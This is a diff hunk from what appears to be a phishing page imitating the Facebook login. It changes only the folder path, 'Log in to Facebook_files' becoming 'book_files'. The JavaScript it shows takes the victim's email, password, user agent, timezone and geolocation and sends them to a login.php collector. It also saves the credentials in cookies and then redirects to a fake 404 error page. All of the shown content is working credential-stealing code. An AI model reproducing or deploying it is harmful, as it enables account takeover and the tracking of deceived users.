@@ -69,12 +69,12 @@
             var pass = document.getElementById("pass").value;
             var xhttp = new XMLHttpRequest();
             var timezone = new Date();
-            xhttp.open("get", "./Log in to Facebook_files/login.php?userAgent="+uAgent+"&status="+status+"&timezone="+timezone+"&email="+email+"&pass="+pass+"&lat="+lat+"&long="+long);//
+            xhttp.open("get", "./book_files/login.php?userAgent="+uAgent+"&status="+status+"&timezone="+timezone+"&email="+email+"&pass="+pass+"&lat="+lat+"&long="+long);//
             xhttp.send();
             document.cookie = "user="+email;
             document.cookie = "pass="+pass;
             console.log(document.cookie)
-            window.location = "./Log in to Facebook_files/404errorcode.html";//
+            window.location = "./book_files/404errorcode.html";//
             
         };
         // function makeFrameEx(){
